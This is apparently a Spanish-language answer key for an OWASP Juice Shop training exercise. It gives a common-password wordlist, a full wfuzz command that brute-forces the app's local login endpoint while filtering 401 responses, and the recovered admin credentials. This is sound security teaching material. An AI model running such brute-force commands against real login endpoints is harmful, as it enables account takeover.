# Solución

### Solución Paso 1: Wordlist

Contraseñas probables para el ataque de diccionario:

```
admin
password
123456
admin2024
admin123
qwerty
01234
00000
```

### Solución Paso 2: Comando Wfuzz

Comando para lanzar el ataque de fuerza bruta contra el endpoint de login, filtrando respuestas 401:

```
wfuzz -z file,~/admin-passlist.txt \
  -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
  -H "Content-Type: application/json" \
  --hc 401 \
  http://localhost:3000/rest/user/login
```

**Explicación:**
- **`z file,~/admin-passlist.txt`**: Usa el archivo como fuente.
- **`"password":"FUZZ"`**: Sustituye `FUZZ` por cada contraseña de la lista.
- **`-hc 401`**: Oculta fallos de autenticación, dejando visible solo el éxito (código 200).

### Solución Paso 3: Credenciales

La contraseña encontrada es:

**`admin123`**

Credenciales finales:
- **Email**: `admin@juice-sh.op`
- **Password**: `admin123`
